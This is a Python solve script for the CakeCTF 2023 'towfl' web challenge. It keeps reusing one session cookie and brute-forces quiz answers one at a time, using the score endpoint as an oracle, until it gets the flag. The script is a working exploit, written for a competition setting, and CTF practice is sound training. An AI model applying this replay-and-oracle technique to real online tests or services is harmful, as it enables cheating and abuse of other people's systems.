# from discord user fr0j
import json
import requests


HOST = "http://towfl.2023.cakectf.com:8888"


def init_session():
    session = requests.session()
    session.post(f"{HOST}/api/start")
    print(f"Session cookie: {session.cookies['session']}")
    return session


def get_score(session):
    cookie = session.cookies['session']
    response = session.get(f"{HOST}/api/score").json()
    session.cookies['session'] = cookie
    return response["data"]["score"]


def get_flag(session):
    cookie = session.cookies['session']
    response = session.get(f"{HOST}/api/score").json()
    session.cookies['session'] = cookie
    return response["data"]["flag"]


def submit_answers(session, answers):
    session.post(f"{HOST}/api/submit", json=answers)
    return


def solve_answers(session):
    # init answers
    answers = []
    for i in range(10): # 10 questions
        answers.append([None,None,None,None,None,None,None,None,None,None]) # 10 answers per question

    score = 0
    print(f"Score: {score}", end="\r")
    for question in range(10):
        for i in range(10):
            for answer in range(4): # answers are in range (0-3)
                answers[question][i] = answer
                submit_answers(session, answers)
                if (_ := get_score(session)) > score:
                    score = _
                    break
            print(f"Score: {score}", end="\r")
    
    # all answers should be correct, get flag
    return get_flag(session)


if __name__ == "__main__":
    session = init_session()
    flag = solve_answers(session)
    print(f"Flag: {flag}")
